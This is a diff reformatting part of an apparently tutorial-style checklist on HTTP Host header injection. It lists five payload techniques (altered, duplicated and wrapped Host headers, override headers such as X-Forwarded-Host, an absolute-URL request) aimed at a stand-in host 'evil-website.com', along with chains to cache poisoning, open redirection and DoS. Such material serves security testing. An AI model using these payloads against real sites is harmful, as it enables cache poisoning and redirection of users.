@@ -31,23 +31,31 @@
     II. Web Cache Poisoning ----> Open Redirection
     III. Web Cache Poisoning ----> Open Redirection ----> Dos
 ```
-### Payloads
-- I. Change the host header
->Host: vulnerable-website.com ----> evil-website.com
+### Payloads:
+>I. Change the host header
+- Host: vulnerable-website.com ----> evil-website.com
     
-- II. Duplicating the host header
->GET /index.php HTTP/1.1 Host: vulnerable-website.com Host: evil-website.com
+>II. Duplicating the host header
+- GET /index.php HTTP/1.1 
+- Host: vulnerable-website.com 
+- Host: evil-website.com
     
-- III. Add host override headers
->X-Forwarded-For: evil-website.com X-Forwarded-Host: evil-website.com X-Client-IP: evil-website.com X-Remote-IP: evil-website.com X-Remote-Addr: evil-website.com X-Host: evil-website.com
+>III. Add host override headers
+- X-Forwarded-For: evil-website.com 
+    X-Forwarded-Host: evil-website.com 
+    X-Client-IP: evil-website.com 
+    X-Remote-IP: evil-website.com 
+    X-Remote-Addr: evil-website.com 
+    X-Host: evil-website.com
 
-- IV. Add line wrapping
->GET /index.php HTTP/1.1 Host: vulnerable-website.com
+>IV. Add line wrapping
+- GET /index.php HTTP/1.1 
+    Host: vulnerable-website.com
+    Host: evil-website.com
 
->Host: evil-website.com
-
-- V. Supply an absolute URL
->GET https://vulnerable-website.com/ HTTP/1.1 Host: evil-website.com
+>V. Supply an absolute URL
+- GET https://vulnerable-website.com/ HTTP/1.1 
+    Host: evil-website.com
 
 
 ## 4. Automation
